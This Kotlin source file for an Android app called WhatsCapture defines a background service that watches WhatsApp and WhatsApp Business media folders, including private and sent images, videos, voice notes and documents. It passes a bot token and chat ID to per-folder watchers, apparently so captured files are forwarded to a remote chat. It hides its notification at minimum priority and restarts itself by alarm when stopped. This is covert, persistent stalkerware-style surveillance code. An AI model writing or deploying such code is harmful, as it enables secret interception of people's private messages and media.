package com.whatscapture

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File

class MediaMonitorService : Service() {

    private val watchers = mutableMapOf<String, MediaWatcher>()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        startForeground(NOTIFICATION_ID, notification)

        getSharedPreferences("config", MODE_PRIVATE)
            .edit().putBoolean("running", true).apply()

        if (watchers.isEmpty()) {
            startWatching()
        }

        return START_STICKY
    }

    override fun onDestroy() {
        watchers.values.forEach { it.stopWatching() }
        watchers.clear()

        if (Config.isServiceEnabled(this)) {
            scheduleServiceRestart(RESTART_DELAY_MS)
        }

        getSharedPreferences("config", MODE_PRIVATE)
            .edit().putBoolean("running", false).apply()
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        if (Config.isServiceEnabled(this)) {
            scheduleServiceRestart(RESTART_DELAY_MS)
        }
        super.onTaskRemoved(rootIntent)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Monitor de WhatsApp",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Servicio de monitoreo en segundo plano"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("WhatsCapture activo")
            .setContentText("Monitoreando notificaciones y archivos")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun startWatching() {
        val token = Config.getToken(this)
        val chatId = Config.getChatId(this)

        val basePaths = mutableListOf<String>()

        val oldBase = "${Environment.getExternalStorageDirectory()}/WhatsApp/Media"
        basePaths.add(oldBase)

        val oldBusinessBase = "${Environment.getExternalStorageDirectory()}/WhatsApp Business/Media"
        basePaths.add(oldBusinessBase)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val newBase = "${Environment.getExternalStorageDirectory()}/Android/media/com.whatsapp/WhatsApp/Media"
            basePaths.add(newBase)

            val newBusinessBase = "${Environment.getExternalStorageDirectory()}/Android/media/com.whatsapp.w4b/WhatsApp Business/Media"
            basePaths.add(newBusinessBase)
        }

        val subdirs = listOf(
            "WhatsApp Images",
            "WhatsApp Images/Sent",
            "WhatsApp Images/Private",
            "WhatsApp Video",
            "WhatsApp Video/Sent",
            "WhatsApp Video/Private",
            "WhatsApp Audio",
            "WhatsApp Audio/Sent",
            "WhatsApp Audio/Private",
            "WhatsApp Documents",
            "WhatsApp Documents/Sent",
            "WhatsApp Documents/Private",
            "WhatsApp Stickers",
            "WhatsApp Animated Gifs",
            "WhatsApp Animated Gifs/Sent",
            "WhatsApp Voice Notes"
        )

        for (base in basePaths) {
            for (sub in subdirs) {
                val fullPath = "$base/$sub"
                addWatcher(fullPath, token, chatId)

                try {
                    val root = File(fullPath)
                    if (root.exists() && root.isDirectory) {
                        root.walkTopDown()
                            .maxDepth(3)
                            .filter { it.isDirectory }
                            .forEach { dir -> addWatcher(dir.absolutePath, token, chatId) }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error explorando subdirectorios en $fullPath", e)
                }
            }
        }

        Log.d(TAG, "Monitoreando ${watchers.size} directorios")
    }

    private fun addWatcher(dirPath: String, token: String, chatId: String) {
        if (watchers.containsKey(dirPath)) return
        try {
            val watcher = MediaWatcher(dirPath, token, chatId)
            watcher.startWatching()
            watchers[dirPath] = watcher
        } catch (e: Exception) {
            Log.e(TAG, "Error en $dirPath", e)
        }
    }

    private fun scheduleServiceRestart(delayMs: Long) {
        val restartIntent = Intent(this, BootReceiver::class.java).apply {
            action = ACTION_KEEP_ALIVE_RESTART
            setPackage(packageName)
        }
        val flags = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        val pendingIntent = PendingIntent.getBroadcast(this, 2001, restartIntent, flags)

        val am = getSystemService(android.app.AlarmManager::class.java)
        am.setExactAndAllowWhileIdle(
            android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + delayMs,
            pendingIntent
        )

        Log.w(TAG, "Reinicio del servicio programado en ${delayMs}ms")
    }

    companion object {
        private const val TAG = "MediaMonitorService"
        private const val CHANNEL_ID = "whatsapp_monitor_channel"
        private const val NOTIFICATION_ID = 1001
        private const val RESTART_DELAY_MS = 5000L
        const val ACTION_KEEP_ALIVE_RESTART = "com.whatscapture.action.KEEP_ALIVE_RESTART"
    }
}
